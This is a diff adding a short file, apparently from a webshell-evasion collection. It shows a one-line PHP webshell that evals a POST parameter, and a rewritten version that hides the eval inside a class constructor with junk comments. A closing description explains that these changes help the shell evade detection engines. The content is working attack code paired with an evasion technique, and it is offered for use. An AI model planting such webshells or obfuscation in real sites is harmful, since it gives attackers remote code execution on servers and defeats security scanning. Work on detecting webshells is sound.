@@ -1,0 +1,27 @@
+Original webshell sample:
+
+'''
+<?php @eval($_POST('a'));?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+class x
+{
+ 
+        function __construct()
+        {      
+                @eval("/*sasas23123*/".$_POST['a']."/*sdfw3123*/");
+        }
+
+}
+new x();
+
+?>
+'''
+
+Description:
+
+The above code uses the method of 'Add unrelated comments' to prevent the attack code from being directly spliced into 'eval($_POST['a'])' to be recognized by the check engine, and uses the class and constructor encapsulation in the php language to further increase the stealthiness of the code.
